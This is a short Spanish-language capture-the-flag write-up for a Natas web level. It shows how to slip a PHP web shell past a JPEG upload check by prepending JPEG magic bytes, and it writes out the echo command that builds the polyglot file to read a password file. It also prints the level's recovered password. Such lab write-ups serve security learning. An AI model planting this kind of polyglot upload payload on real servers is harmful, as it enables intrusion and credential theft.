Para resolver este nivel nos damos cuenta que es un reto muy parecido al anterior solo que como un extra nos damos cuenta que se le agregó mas seguridad dado a que ahora verifica que sea un archivo jpg si o si, pero hay una forma de burlar este obstáculo, que sería hacer uso de los magic bytes, que son una firma por decirlo así, que muestra que archivo es, independientemente de su extensión, entonces ahora vamos a crear un archivo conocido como archivo poliglota, que es un archivo diseñado para ser válido en dos o más formatos distintos simultáneamente.
para crear este archivo vamos a hacer uso del echo -e, para que no ignore los \
``` bash
echo -e "\xff\xd8\xff\xe0\n<?php echo shell_exec('cat /etc/natas_webpass/natas14'); ?>" > poligloit.php
```
Para crearlo tenemos que usar el x para decirle que es un hexadecimal y el magicbyte de jpg
Creando este archivo vamos a hacer lo mismo que el nivel anterior, vamos a subirlo y despues cambiar el formato de archivo desde el f12
![](../../../images/Pasted%20image%2020260422142632.png)
Hacemos lo mismo de ingresar a la ruta de imagen que nos da y nos da nuestra contraseña que en este caso sería:
``` zsh
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```



